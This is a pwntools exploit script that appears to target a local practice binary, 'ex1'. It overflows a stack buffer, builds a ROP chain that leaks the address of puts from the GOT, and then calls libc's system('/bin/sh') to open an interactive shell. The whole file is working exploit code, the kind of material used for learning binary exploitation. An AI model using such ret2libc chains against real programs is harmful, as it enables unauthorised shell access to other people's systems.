from pwn import *

context.arch = "amd64"

target = process("./bin/ex1")

io = gdb.debug(
    "./bin/ex1",
    """
    break ex1.c:16
    c
    c
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)

puts_plt = p64(0x401036)
puts_got = p64(0x404000)


# gadget1 = 0x000000000040116e : pop rsi ; pop rdi ; pop rbp ; ret
# gadget2 = 0x000000000040116f : pop rdi ; pop rbp ; ret

rop_gadget1 = p64(0x40116F)
rop_gadget2 = p64(0x40116E)

bin_sh_offset = 0x11E6B1
system_offset = -0x2B4F0

main = p64(0x401172)

payload = b"A" * 0x28 + rop_gadget1 + puts_got + b"A" * 0x8 + puts_plt + main

io.recvline()
io.recvline()
io.sendline(payload)
puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(hex(puts_leak))
io.recvline()
io.recvline()

payload = (
    b"A" * 0x28
    + rop_gadget2
    + b"A" * 0x8
    + p64(puts_leak + bin_sh_offset)
    + b"A" * 0x8
    + p64(puts_leak + system_offset)
)

io.sendline(payload)
io.interactive()
